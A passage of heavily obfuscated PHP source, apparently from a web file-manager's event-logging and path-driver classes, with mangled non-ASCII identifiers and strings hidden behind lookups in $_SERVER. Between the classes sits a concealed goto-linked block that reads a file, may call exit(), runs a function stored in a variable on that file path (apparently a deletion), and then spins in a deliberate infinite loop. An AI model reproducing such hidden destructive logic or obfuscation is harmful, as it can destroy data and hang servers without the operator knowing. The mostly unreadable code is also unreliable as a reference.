$€ŸËş•[228] && count($ÈŞõĞ–) > $‘Æ®áù) { $“œĞìÁÆ = array_slice($ÈŞõĞ–, $‘Æ®áù); $µÑ¾Ï×Š = array_merge($µÑ¾Ï×Š, array_reverse($“œĞìÁÆ)); } $íêìÄö = array_merge($íêìÄö, $µÑ¾Ï×Š); } $İÆ±ÛÄ[$ø…±µÖË] = array_unique($íêìÄö); return $İÆ±ÛÄ[$ø…±µÖË]; } public function authTargetInfoMake($¤çº¥üå) { $®’ƒğ™ =& $_SERVER[”øäÃÍª]; $©äñ£æ¿ = array(); $îò“ò·ç = array(); foreach ($¤çº¥üå as $±ŠßÆóù) { if ($±ŠßÆóù[$®’ƒğ™[188]] == SourceModel::TYPE_USER) { $©äñ£æ¿[] = intval($±ŠßÆóù[$®’ƒğ™[597]]); } else { if ($±ŠßÆóù[$®’ƒğ™[188]] == SourceModel::TYPE_GROUP) { $îò“ò·ç[] = intval($±ŠßÆóù[$®’ƒğ™[597]]); } } } if ($©äñ£æ¿) { $©äñ£æ¿ = Model($®’ƒğ™[605])->userListInfo($©äñ£æ¿); } if ($îò“ò·ç) { $©ûíÙ€ë = array($®’ƒğ™[2225] => array($®’ƒğ™[515], $îò“ò·ç)); $îò“ò·ç = Model($®’ƒğ™[613])->field($®’ƒğ™[2363])->where($©ûíÙ€ë)->select(); $îò“ò·ç = array_to_keyvalue($îò“ò·ç, $®’ƒğ™[1450]); } return array($®’ƒğ™[2364] => $©äñ£æ¿, $®’ƒğ™[2365] => $îò“ò·ç); } public function authInfo($µØÄïşï) { $ã®·“¢ß =& $_SERVER[”øäÃÍª]; if ($µØÄïşï[$ã®·“¢ß[1595]]) { $Ë‡…¢œµ = Model($ã®·“¢ß[599])->listData($µØÄïşï[$ã®·“¢ß[1595]]); if (!$Ë‡…¢œµ) { return !1; $¹¼Óêº = Model($ã®·“¢ß[599])->listData(); $ÚÅõ¨õ² = array_filter_by_field($¹¼Óêº, $ã®·“¢ß[510], $ã®·“¢ß[228]); return $ÚÅõ¨õ²; } $èã‹ç¤£ = array_field_key($Ë‡…¢œµ, array($ã®·“¢ß[487], $ã®·“¢ß[32], $ã®·“¢ß[510], $ã®·“¢ß[2161], $ã®·“¢ß[2162])); $èã‹ç¤£[$ã®·“¢ß[2366]] = $µØÄïşï; return $èã‹ç¤£; } else { return array($ã®·“¢ß[516] => 0, $ã®·“¢ß[2146] => $µØÄïşï[$ã®·“¢ß[2301]], $ã®·“¢ß[517] => $ã®·“¢ß[12], $ã®·“¢ß[2161] => $ã®·“¢ß[2367]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\143\x65\x5f\x65\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\x74\151\157\156"), array("\x64\x65\163\143", '', "\151\156\163\145\x72\x74\54\x75\x70\144\x61\164\x65\54\163\x65\154\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ëáÏ¼ù½, $“ùá³·, $•«»‡µ = '') { $°Ş„òİ‹ =& $_SERVER[”øäÃÍª]; if (!$this->eventSave) { return; } $í’¯Á½Ì = Model($°Ş„òİ‹[1488])->sourceInfo($ëáÏ¼ù½); if (!$í’¯Á½Ì) { return !1; } if ($this->isDisableEvent($í’¯Á½Ì, $“ùá³·)) { return; } if ($•«»‡µ && is_string($•«»‡µ)) { $•«»‡µ = array($°Ş„òİ‹[2178] => $•«»‡µ); } $áİáŸ  = KodUser::id(); $É‹«óşû = array($°Ş„òİ‹[514] => $ëáÏ¼ù½, $°Ş„òİ‹[2368] => $í’¯Á½Ì[$°Ş„òİ‹[190]], $°Ş„òİ‹[2369] => $í’¯Á½Ì[$°Ş„òİ‹[32]], $°Ş„òİ‹[610] => !empty($í’¯Á½Ì[$°Ş„òİ‹[610]]) ? $í’¯Á½Ì[$°Ş„òİ‹[610]] : $°Ş„òİ‹[12], $°Ş„òİ‹[1925] => $áİáŸ , $°Ş„òİ‹[519] => $“ùá³·, $°Ş„òİ‹[1927] => $•«»‡µ); $this->addSystemLog($“ùá³·, $É‹«óşû); unset($É‹«óşû[$°Ş„òİ‹[2369]], $É‹«óşû[$°Ş„òİ‹[610]]); return $this->add($É‹«óşû); } private function addSystemLog($½òìÇ£ó, $•®©²ÏÉ) { $¡ûø³ÔÆ =& $_SERVER[”øäÃÍª]; if ($½òìÇ£ó == $¡ûø³ÔÆ[2370]) { $½òìÇ£ó = $•®©²ÏÉ[$¡ûø³ÔÆ[548]][$¡ûø³ÔÆ[2371]]; } else { if (in_array($½òìÇ£ó, array($¡ûø³ÔÆ[1518], $¡ûø³ÔÆ[2372]))) { $½òìÇ£ó = $•®©²ÏÉ[$¡ûø³ÔÆ[548]][$¡ûø³ÔÆ[168]]; } } $¹³Ò‡ç¸ = array_merge($•®©²ÏÉ, array($¡ûø³ÔÆ[2373] => $•®©²ÏÉ[$¡ûø³ÔÆ[191]], $¡ûø³ÔÆ[2374] => $•®©²ÏÉ[$¡ûø³ÔÆ[2374]])); Hook::trigger($¡ûø³ÔÆ[2375], $¡ûø³ÔÆ[2376] . $½òìÇ£ó, $•®©²ÏÉ); Model($¡ûø³ÔÆ[2087])->addLog($¡ûø³ÔÆ[2376] . $½òìÇ£ó, $¹³Ò‡ç¸); } private function isDisableEvent($œÅÒ¹€Å, $Ë±ª‡ï¨) { $ıõŠõ˜Õ =& $_SERVER[”øäÃÍª]; if ($œÅÒ¹€Å[$ıõŠõ˜Õ[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ë±ª‡ï¨ == $ıõŠõ˜Õ[1286]) { return !1; } return !0; } public function eventCreate($¹Ò€ö ¡, $ÏïˆÎãú) { $ª¡Ô½şè =& $_SERVER[”øäÃÍª]; $Å§©Æ®„ = Model($ª¡Ô½şè[1488])->sourceInfo($¹Ò€ö ¡); $­×ÆÏ¬Û = array($ª¡Ô½şè[2371] => $ÏïˆÎãú, $ª¡Ô½şè[32] => $Å§©Æ®„[$ª¡Ô½şè[32]]); return $this->addEvent($¹Ò€ö ¡, $ª¡Ô½şè[2370], $­×ÆÏ¬Û); } public function eventFileEdit($ò×¹ó) { $çÇâ½Áà =& $_SERVER[”øäÃÍª]; $¹†€Ñ = array($çÇâ½Áà[2377] => $_SERVER[$çÇâ½Áà[2378]], $çÇâ½Áà[2379] => strtolower(ACTION)); if (isset($GLOBALS[$çÇâ½Áà[7]][$çÇâ½Áà[1578]])) { $¹†€Ñ[$çÇâ½Áà[1578]] = $çÇâ½Áà[91]; } return $this->addEvent($ò×¹ó, $çÇâ½Áà[1517], $¹†€Ñ); } public function eventRecycle($ƒÙ„áÛì, $À†Õò½¦) { return $this->addEvent($ƒÙ„áÛì, $_SERVER[”øäÃÍª][2372], $À†Õò½¦); } private static $_removeLast = ''; public function eventRemove($õª·Ÿù) { $Ò¡àŸÑì =& $_SERVER[”øäÃÍª]; self::$_removeLast = $õª·Ÿù; $ÛŠƒ­²æ = Model($Ò¡àŸÑì[1488])->sourceInfo($õª·Ÿù); $‰Ñ€®ß = array_field_key($ÛŠƒ­²æ, array($Ò¡àŸÑì[191], $Ò¡àŸÑì[565], $Ò¡àŸÑì[528], $Ò¡àŸÑì[612])); $´à±Ïƒ = array($Ò¡àŸÑì[168] => $ÛŠƒ­²æ[$Ò¡àŸÑì[32]], $Ò¡àŸÑì[2379] => ACTION, $Ò¡àŸÑì[2380] => $‰Ñ€®ß); return $this->addEvent($ÛŠƒ­²æ[$Ò¡àŸÑì[190]], $Ò¡àŸÑì[1286], $´à±Ïƒ); } public function eventShare($Äã—í‚ğ, $¹‚¸ş˜¤) { return $this->addEvent($Äã—í‚ğ, $_SERVER[”øäÃÍª][1518], $¹‚¸ş˜¤); } public function eventMove($’û¹œë , $¦£È¿û, $ˆ©Í²óŠ) { $™îüˆã =& $_SERVER[”øäÃÍª]; if (self::$_removeLast == $’û¹œë ) { return; } $° üñ²½ = Model($™îüˆã[1488]); $‡˜€øä¢ = $° üñ²½->sourceInfo($’û¹œë ); $„ËÏ©ğ = $° üñ²½->sourceInfo($¦£È¿û); $Âí«ó¶¾ = $° üñ²½->sourceInfo($ˆ©Í²óŠ); $î™£ö«Ò = array($™îüˆã[1298] => $¦£È¿û, $™îüˆã[2381] => $„ËÏ©ğ[$™îüˆã[32]], $™îüˆã[2339] => !empty($„ËÏ©ğ[$™îüˆã[610]]) ? $„ËÏ©ğ[$™îüˆã[610]] : $™îüˆã[12], $™îüˆã[1299] => $ˆ©Í²óŠ, $™îüˆã[2382] => $Âí«ó¶¾[$™îüˆã[32]], $™îüˆã[2383] => !empty($Âí«ó¶¾[$™îüˆã[610]]) ? $Âí«ó¶¾[$™îüˆã[610]] : $™îüˆã[12]); $this->addEvent($’û¹œë , $™îüˆã[651], $î™£ö«Ò); $‡˜€øä¢ = $° üñ²½->sourceInfo($’û¹œë ); $î™£ö«Ò = array($™îüˆã[191] => $‡˜€øä¢[$™îüˆã[191]], $™îüˆã[32] => $‡˜€øä¢[$™îüˆã[32]]); $this->addEvent($¦£È¿û, $™îüˆã[2384], $î™£ö«Ò); } public function eventCopy($¿í‰ÜÒ) { $this->eventCreate($¿í‰ÜÒ, $_SERVER[”øäÃÍª][649]); } public function eventRename($¬£„ÍçÑ, $ì§í‚¹½, $ä¡íÌ§Ú) { $È’ªÍõ =& $_SERVER[”øäÃÍª]; $ŒáòùåÛ = array($È’ªÍõ[1298] => $ì§í‚¹½, $È’ªÍõ[1299] => $ä¡íÌ§Ú); return $this->addEvent($¬£„ÍçÑ, $È’ªÍõ[1502], $ŒáòùåÛ); } public function eventAddComment($òÆñìÚÀ, $ƒ˜¢¡ªï) { return $this->addEvent($òÆñìÚÀ, $_SERVER[”øäÃÍª][2385], $ƒ˜¢¡ªï); } public function eventAddDesc($¨ŸÊÒ÷“, $À¢ì¬ÜŞ) { return $this->addEvent($¨ŸÊÒ÷“, $_SERVER[”øäÃÍª][2386], $À¢ì¬ÜŞ); } public function listBySource($“ıÔç´) { $…ÈÊœ¸‘ =& $_SERVER[”øäÃÍª]; $ó÷Ÿ°°Á = Model($…ÈÊœ¸‘[1488])->sourceInfo($“ıÔç´); $ë†º÷¦ = array($…ÈÊœ¸‘[514] => $“ıÔç´); if ($ó÷Ÿ°°Á[$…ÈÊœ¸‘[508]] == $…ÈÊœ¸‘[91]) { $ãÌšó²© = Model($…ÈÊœ¸‘[1488])->listSearchChildren($“ıÔç´, 20000); $ãÌšó²©[] = $“ıÔç´ . $…ÈÊœ¸‘[463]; $ë†º÷¦ = array($…ÈÊœ¸‘[191] => array($…ÈÊœ¸‘[7], $ãÌšó²©)); } $ÊÙ¥¥›‚ = $this->where($ë†º÷¦)->order($…ÈÊœ¸‘[2387])->selectPage(); if ($ÊÙ¥¥›‚[$…ÈÊœ¸‘[443]][$…ÈÊœ¸‘[444]] == 0) { $ÊÙ¥¥›‚[$…ÈÊœ¸‘[443]][$…ÈÊœ¸‘[444]] = 1; $ÊÙ¥¥›‚[$…ÈÊœ¸‘[446]] = array(array($…ÈÊœ¸‘[514] => $“ıÔç´, $…ÈÊœ¸‘[2368] => $ó÷Ÿ°°Á[$…ÈÊœ¸‘[190]], $…ÈÊœ¸‘[1925] => $ó÷Ÿ°°Á[$…ÈÊœ¸‘[549]], $…ÈÊœ¸‘[519] => $…ÈÊœ¸‘[2388], $…ÈÊœ¸‘[520] => $ó÷Ÿ°°Á[$…ÈÊœ¸‘[231]], $…ÈÊœ¸‘[1927] => $…ÈÊœ¸‘[12])); } return $this->eventListParse($ÊÙ¥¥›‚, $“ıÔç´); } private function eventListParse($ÀæµöÊÒ, $£ùã´Éª) { $Úé¤ŒĞ =& $_SERVER[”øäÃÍª]; $Òû¼ºÉ¿ = $ÀæµöÊÒ[$Úé¤ŒĞ[446]]; $‰™ó¦ˆ¯ = array_to_keyvalue($Òû¼ºÉ¿, $Úé¤ŒĞ[12], $Úé¤ŒĞ[191]); $Æ–‚‚Ûà = array_to_keyvalue($Òû¼ºÉ¿, $Úé¤ŒĞ[12], $Úé¤ŒĞ[2374]); foreach ($Òû¼ºÉ¿ as $«°ëˆ¢) { $ñ»‘˜¾Ñ = $«°ëˆ¢[$Úé¤ŒĞ[548]]; if ($«°ëˆ¢[$Úé¤ŒĞ[33]] == $Úé¤ŒĞ[651] && isset($ñ»‘˜¾Ñ[$Úé¤ŒĞ[1298]])) { $‰™ó¦ˆ¯[] = $ñ»‘˜¾Ñ[$Úé¤ŒĞ[1298]] . $Úé¤ŒĞ[12]; $‰™ó¦ˆ¯[] = $ñ»‘˜¾Ñ[$Úé¤ŒĞ[1299]] . $Úé¤ŒĞ[12]; } if ($«°ëˆ¢[$Úé¤ŒĞ[33]] == $Úé¤ŒĞ[2384] && isset($ñ»‘˜¾Ñ[$Úé¤ŒĞ[191]])) { $‰™ó¦ˆ¯[] = $ñ»‘˜¾Ñ[$Úé¤ŒĞ[191]] . $Úé¤ŒĞ[12]; } } $‰™ó¦ˆ¯ = array_merge($‰™ó¦ˆ¯, $Æ–‚‚Ûà, array($£ùã´Éª . $Úé¤ŒĞ[12])); $‰™ó¦ˆ¯ = array_unique($‰™ó¦ˆ¯); $é·–‹ªå = array_unique(array_to_keyvalue($Òû¼ºÉ¿, $Úé¤ŒĞ[12], $Úé¤ŒĞ[1548])); $ñÓÇªÁ¨ = Model($Úé¤ŒĞ[625])->userListInfo($é·–‹ªå); $ëˆ§²¢ù = Model($Úé¤ŒĞ[941])->sourceListInfo($‰™ó¦ˆ¯, !0); foreach ($Òû¼ºÉ¿ as &$«°ëˆ¢) { if ($«°ëˆ¢[$Úé¤ŒĞ[33]] == $Úé¤ŒĞ[651] && isset($«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[1298]])) { $«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[1298]] = $ëˆ§²¢ù[$«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[1298]]]; $«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[1299]] = $ëˆ§²¢ù[$«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[1299]]]; } if ($«°ëˆ¢[$Úé¤ŒĞ[33]] == $Úé¤ŒĞ[2384] && isset($«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[191]])) { $«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[191]] = $ëˆ§²¢ù[$«°ëˆ¢[$Úé¤ŒĞ[548]][$Úé¤ŒĞ[191]]]; } $«°ëˆ¢[$Úé¤ŒĞ[90]] = $ëˆ§²¢ù[$«°ëˆ¢[$Úé¤ŒĞ[191]]]; $«°ëˆ¢[$Úé¤ŒĞ[2389]] = $ëˆ§²¢ù[$«°ëˆ¢[$Úé¤ŒĞ[2374]]]; if ($«°ëˆ¢[$Úé¤ŒĞ[33]] == $Úé¤ŒĞ[1286]) { $«°ëˆ¢[$Úé¤ŒĞ[2389]] = $«°ëˆ¢[$Úé¤ŒĞ[90]]; $«°ëˆ¢[$Úé¤ŒĞ[2374]] = $«°ëˆ¢[$Úé¤ŒĞ[2389]][$Úé¤ŒĞ[191]]; $«°ëˆ¢[$Úé¤ŒĞ[90]] = !1; $«°ëˆ¢[$Úé¤ŒĞ[191]] = $Úé¤ŒĞ[12]; } $«°ëˆ¢[$Úé¤ŒĞ[2313]] = $ñÓÇªÁ¨[$«°ëˆ¢[$Úé¤ŒĞ[1548]]]; } unset($«°ëˆ¢); $ÀæµöÊÒ[$Úé¤ŒĞ[446]] = $Òû¼ºÉ¿; return $ÀæµöÊÒ; } public function removeBySource($°ÔÀî†) { $ŸœıÛ¨ = array($_SERVER[”øäÃÍª][514] => $°ÔÀî†); $this->where($ŸœıÛ¨)->remove(); } } goto b›òÔãŠ‚; eéßÔ ½ã: if (!isset($_SERVER[$_SERVER[”øäÃÍª][492]]) || !isset($_SERVER[$_SERVER[”øäÃÍª][493]])) { $_getc = $_SERVER[”øäÃÍª][494]; $_getfile = $_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”øäÃÍª][285], $_getfilec); if (count($_getarrs) < $_SERVER[”øäÃÍª][497]) { $exit = $_SERVER[”øäÃÍª][498]; $exit(); } $_act = $_SERVER[”øäÃÍª][499]; $_act($_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[”øäÃÍª][463]); } } goto añ«‡ê Æƒ; aï®æÀ»: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $œÅàÚ˜Ù =& $_SERVER[”øäÃÍª]; $this->objectDriver = array($œÅàÚ˜Ù[60], $œÅàÚ˜Ù[61], $œÅàÚ˜Ù[62], $œÅàÚ˜Ù[63], $œÅàÚ˜Ù[64], $œÅàÚ˜Ù[65], $œÅàÚ˜Ù[66], $œÅàÚ˜Ù[67], $œÅàÚ˜Ù[68], $œÅàÚ˜Ù[69], $œÅàÚ˜Ù[70], $œÅàÚ˜Ù[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¤õ“à÷) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¤õ“à÷, $_SERVER[”øäÃÍª][8]); } return $¤õ“à÷; } public function iconvApp($‘óÉ×³€) { return $‘óÉ×³€; } public function iconvSystem($ãÇ±¾ÕÖ) { return $ãÇ±¾ÕÖ; } public function iconvTo($éöÄÑ©Á, $”Õ»Âë, $Óå‡˜è×) { $Êô«‘ìœ =& $_SERVER[”øäÃÍª]; if (!$éöÄÑ©Á || !function_exists($Êô«‘ìœ[72])) { return $éöÄÑ©Á; } static $ãğÕíÖ = array(); $şüÆ“úº = $”Õ»Âë . $Êô«‘ìœ[73] . $Óå‡˜è× . $Êô«‘ìœ[74] . $éöÄÑ©Á; if (isset($ãğÕíÖ[$şüÆ“úº])) { return $ãğÕíÖ[$şüÆ“úº]; } if (function_exists($Êô«‘ìœ[75])) { $²ß—™ÖÓ = @mb_convert_encoding($éöÄÑ©Á, $Óå‡˜è×, $”Õ»Âë); } else { $²ß—™ÖÓ = @iconv($”Õ»Âë, $Óå‡˜è×, $éöÄÑ©Á); } $²ß—™ÖÓ = $²ß—™ÖÓ ? $²ß—™ÖÓ : $éöÄÑ©Á; if (strstr($²ß—™ÖÓ, $Êô«‘ìœ[76])) { $²ß—™ÖÓ = str_replace($Êô«‘ìœ[76], $Êô«‘ìœ[11], $²ß—™ÖÓ); } $ãğÕíÖ[$”Õ»Âë . $Êô«‘ìœ[73] . $Óå‡˜è× . $Êô«‘ìœ[74] . $éöÄÑ©Á] = $²ß—™ÖÓ; $ãğÕíÖ[$Óå‡˜è× . $Êô«‘ìœ[73] . $”Õ»Âë . $Êô«‘ìœ[74] . $éöÄÑ©Á] = $éöÄÑ©Á; $ãğÕíÖ[$Óå‡˜è× . $Êô«‘ìœ[73] . $”Õ»Âë . $Êô«‘ìœ[74] . $²ß—™ÖÓ] = $éöÄÑ©Á; $ãğÕíÖ[$”Õ»Âë . $Êô«‘ìœ[73] . $Óå‡˜è× . $Êô«‘ìœ[74] . $²ß—™ÖÓ] = $²ß—™ÖÓ; return $²ß—™ÖÓ; } public function getPathInner($¯Ì¢´Õç) { $Æ¯Š‡­Í = IO::init($¯Ì¢´Õç); return $Æ¯Š‡­Í->path; } public function getPathOuter($†Ò·¬ò¨) { $ƒÅäÎå‚ =& $_SERVER[”øäÃÍª]; $¥Ä²ĞÀÍ = strlen(trim($this->pathBase, $ƒÅäÎå‚[8])); $†Ò·¬ò¨ = substr(trim($†Ò·¬ò¨, $ƒÅäÎå‚[8]), $¥Ä²ĞÀÍ); return $this->pathDriver . $ƒÅäÎå‚[8] . ltrim($†Ò·¬ò¨, $ƒÅäÎå‚[8]); } public function isParentOf($ûùê—²Å, $çÇı² ) { $¸ï´ùÎ =& $_SERVER[”øäÃÍª]; $ûùê—²Å = rtrim(strtolower($ûùê—²Å), $¸ï´ùÎ[8]) . $¸ï´ùÎ[8]; $çÇı²  = rtrim(strtolower($çÇı² ), $¸ï´ùÎ[8]) . $¸ï´ùÎ[8]; $¨Æ¿‘¡» = strpos($çÇı² , $ûùê—²Å) === 0; return $¨Æ¿‘¡»; } public function getType() { $‚ƒÂš¬í =& $_SERVER[”øäÃÍª]; $ª“Ü–¤ƒ = str_replace($‚ƒÂš¬í[77], $‚ƒÂš¬í[12], get_class($this)); return strtolower($ª“Ü–¤ƒ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‡©ßÚ¸, $§ÙÊğŞ¿) { $‡ûçğ…ù =& $_SERVER[”øäÃÍª]; $ŠŞ„ä¦¨ = rtrim($‡©ßÚ¸, $‡ûçğ…ù[8]) . $‡ûçğ…ù[8] . $§ÙÊğŞ¿; $Òà®“¼á = $this->exist($ŠŞ„ä¦¨); return $Òà®“¼á ? $ŠŞ„ä¦¨ : !1; } public function setModifyTime($¤Ñ¦†±Ê, $ÖÁ´Ğäó = '') { } public function renameObject($šĞ…È¦Æ, $«Ê‡«ÌÛ) { $µ££è±Ó = $«Ê‡«ÌÛ; $šĞ…È¦Æ = $this->getPathOuter($šĞ…È¦Æ); $«Ê‡«ÌÛ = $this->pathFather($šĞ…È¦Æ) . $«Ê‡«ÌÛ; $éœµŸ£ = IO::copy($šĞ…È¦Æ, $this->pathFather($šĞ…È¦Æ), REPEAT_RENAME_FOLDER, $µ££è±Ó); if ($éœµŸ£) { IO::remove($šĞ…È¦Æ); } return $éœµŸ£ ? $«Ê‡«ÌÛ : !1; } public function tempFile($ºÑ´¤èÃ = '', $üüÕËÎ³ = '') { if (!$ºÑ´¤èÃ) { $ºÑ´¤èÃ = rand_string(15); } $¸¤†Ú•ğ = TEMP_FILES . rand_string(15) . $_SERVER[”øäÃÍª][8]; @mkdir($¸¤†Ú•ğ, DEFAULT_PERRMISSIONS, !0); $Ó¢€èíë = $¸¤†Ú•ğ . $ºÑ´¤èÃ; @touch($Ó¢€èíë); if ($üüÕËÎ³) { file_put_contents($Ó¢€èíë, $üüÕËÎ³); } return $Ó¢€èíë; } public function tempFileRemve($¥Õºéœò) { @unlink($¥Õºéœò); @rmdir($this->pathFather($¥Õºéœò)); } public function mkfile($Âû“‡ì, $¶ÒÈ¡„É = '', $­¨ñâ×¯ = REPEAT_RENAME) { } public function mkdir($Ñ©«¹ò—, $‰ıÕÎŞí = REPEAT_SKIP) { } public function delFile($İô÷‰Ø) { } public function delFolder($È‰ê•‰Ï) { } public function copyFile($¦¬…—…, $§ì»õ¨“) { } public function moveFile($ÓğŸÈ ù, $‘Ğõ³¥è) { } public function remove($˜¯´ğô™) { if ($this->isFile($˜¯´ğô™)) { return $this->delFile($˜¯´ğô™); } return $this->delFolder($˜¯´ğô™); } public function rename($øñö£Ë, $º»õğæ¨) { } public function exist($‡³Æ€¯ä) { } public function isFile($ëÚ´şÃ¦) { } public function isFolder($ÕÆÆ¡ò) { } public function size($À£ßœŠ) { } public function info($¾‰µî°) { } public function infoSimple($æÔ“ğÏ¦) { return $this->info($æÔ“ğÏ¦); } public function infoAuth($¹­ûµŒ­) { return $this->info($¹­ûµŒ­); } public function infoFull($Óôç´øå) { return $this->info($Óôç´øå); } public function infoFullSimple($“ú¾÷Œ°) { return $this->info($“ú¾÷Œ°); } public function infoWithChildren($­‚Ş’¬Í) { $£ô…“Ü¿ =& $_SERVER[”øäÃÍª]; static $Á‰†Ïï = array(); if (isset($Á‰†Ïï[$­‚Ş’¬Í])) { return $Á‰†Ïï[$­‚Ş’¬Í]; } $¤ˆ¼ï” = $this->info($­‚Ş’¬Í); if ($¤ˆ¼ï” && $¤ˆ¼ï”[$£ô…“Ü¿[33]] == $£ô…“Ü¿[78]) { $î¸í½´¡ = array($£ô…“Ü¿[79] => 0, $£ô…“Ü¿[80] => 0, $£ô…“Ü¿[81] => 0); $this->infoChildren($­‚Ş’¬Í, $î¸í½´¡); $¤ˆ¼ï”[$£ô…“Ü¿[79]] = $î¸í½´¡[$£ô…“Ü¿[79]]; $¤ˆ¼ï”[$£ô…“Ü¿[82]] = array($£ô…“Ü¿[83] => $î¸í½´¡[$£ô…“Ü¿[80]], $£ô…“Ü¿[84] => $î¸í½´¡[$£ô…“Ü¿[81]]); $Á‰†Ïï[$­‚Ş’¬Í] = $¤ˆ¼ï”; } return $¤ˆ¼ï”; } public function listPath($üÒÙˆ“, $ˆòíÙ˜Ü = false) { } public function has($”ƒô±ì¿, $şŠ ó‰ = false, $²äüÚ÷Ô = false) { } public function canRead($æïà¶°Ï) { } public function canWrite($–Ö’Åè’) { } public function getContent($à…‡¯¨¿) { } public function setContent($®ƒØ¾İü, $Ïä×ê¼Ù = '') { } protected function infoChildren($ıÄÂÌ¥­, &$‰Îß«ÏÀ) { $ò‰®Ä• =& $_SERVER[”øäÃÍª]; check_abort_echo(); $­¢Éëû” = $this->listPath($ıÄÂÌ¥­, !0); $­¢Éëû” = array_merge($­¢Éëû”[$ò‰®Ä•[85]], $­¢Éëû”[$ò‰®Ä•[86]]); foreach ($­¢Éëû” as $„„Ë”Ñ­) { if ($„„Ë”Ñ­[$ò‰®Ä•[33]] == $ò‰®Ä•[78]) { $‰Îß«ÏÀ[$ò‰®Ä•[81]]++; $™¯â¾¾‹ = $this->getPathInner($„„Ë”Ñ­[$ò‰®Ä•[87]]); $this->infoChildren($™¯â¾¾‹, $‰Îß«ÏÀ); } else { $‰Îß«ÏÀ[$ò‰®Ä•[80]]++; $‰Îß«ÏÀ[$ò‰®Ä•[79]] += $„„Ë”Ñ­[$ò‰®Ä•[79]]; } } } public function fileSubstr($ö²ò°», $”¦ÎÍÎ, $¦¶ØÍ™ğ) { } public function listAll($ØÄÛêÙë) { } public function listAllMake($Ú…÷ËÓÖ, &$¾ß¡šÏ) { $ÀíÁéÓú =& $_SERVER[”øäÃÍª]; check_abort_echo(); $°„¶»˜“ = $this->listPath($Ú…÷ËÓÖ, !0); if (!$°„¶»˜“) { return; } $ãıãí¨ï = array_merge($°„¶»˜“[$ÀíÁéÓú[85]], $°„¶»˜“[$ÀíÁéÓú[86]]); foreach ($ãıãí¨ï as $ş¡À®ğ) { $Úûİ±æİ = $ş¡À®ğ[$ÀíÁéÓú[33]] == $ÀíÁéÓú[78]; $ó®£ƒç› = array($ÀíÁéÓú[87] => $ş¡À®ğ[$ÀíÁéÓú[87]], $ÀíÁéÓú[78] => $Úûİ±æİ); if (isset($ş¡À®ğ[$ÀíÁéÓú[79]])) { $ó®£ƒç›[$ÀíÁéÓú[79]] = $ş¡À®ğ[$ÀíÁéÓú[79]]; } if (isset($ş¡À®ğ[$ÀíÁéÓú[88]])) { $ó®£ƒç›[$ÀíÁéÓú[88]] = $ş¡À®ğ[$ÀíÁéÓú[88]]; } if (!$Úûİ±æİ) { $¾ß¡šÏ[] = $ó®£ƒç›; continue; } $¾ß¡šÏ[] = $ó®£ƒç›; $–ùÌÁœ¥ = $ş¡À®ğ[$ÀíÁéÓú[87]]; $Ó‚µƒö = $this->pathDriver; if (substr($ş¡À®ğ[$ÀíÁéÓú[87]], 0, strlen($Ó‚µƒö)) == $Ó‚µƒö) { $–ùÌÁœ¥ = substr($–ùÌÁœ¥, strlen($Ó‚µƒö)); } $this->listAllMake($–ùÌÁœ¥, $¾ß¡šÏ); } } public function listAllSimple($ä‰±ÀÊ„, $”‰ÃÍŠ = false) { $Ò‚–ª•ª = $this->listAll($ä‰±ÀÊ„); return $this->listAllSimpleMake($Ò‚–ª•ª, $this->getPathOuter($ä‰±ÀÊ„), $”‰ÃÍŠ); } public function listAllSimpleMake($Â½“²æ•, $‹ğ¾·°Ó, $Ù…À¥Ï) { $‚î­ø¦¥ =& $_SERVER[”øäÃÍª]; $Ş‡ïö’Ñ = array(); $‹ğ¾·°Ó = rtrim(get_path_father($‹ğ¾·°Ó), $‚î­ø¦¥[8]) . $‚î­ø¦¥[8]; foreach ($Â½“²æ• as $¹ÙÉÌ¿) { $¡œˆ„‹ = array($‚î­ø¦¥[87] => $¹ÙÉÌ¿[$‚î­ø¦¥[87]], $‚î­ø¦¥[89] => $¹ÙÉÌ¿[$‚î­ø¦¥[87]], $‚î­ø¦¥[78] => $¹ÙÉÌ¿[$‚î­ø¦¥[78]]); if (isset($¹ÙÉÌ¿[$‚î­ø¦¥[79]]) && !$¹ÙÉÌ¿[$‚î­ø¦¥[78]]) { $¡œˆ„‹[$‚î­ø¦¥[79]] = $¹ÙÉÌ¿[$‚î­ø¦¥[79]]; } if (isset($¹ÙÉÌ¿[$‚î­ø¦¥[88]])) { $¡œˆ„‹[$‚î­ø¦¥[88]] = $¹ÙÉÌ¿[$‚î­ø¦¥[88]]; } if (is_array($¹ÙÉÌ¿[$‚î­ø¦¥[90]])) { $¡œˆ„‹[$‚î­ø¦¥[89]] = $¹ÙÉÌ¿[$‚î­ø¦¥[90]][$‚î­ø¦¥[87]]; $¡œˆ„‹[$‚î­ø¦¥[79]] = $¹ÙÉÌ¿[$‚î­ø¦¥[90]][$‚î­ø¦¥[79]]; $¡œˆ„‹[$‚î­ø¦¥[88]] = $¹ÙÉÌ¿[$‚î­ø¦¥[90]][$‚î­ø¦¥[88]]; } else { if (substr($¹ÙÉÌ¿[$‚î­ø¦¥[87]], 0, 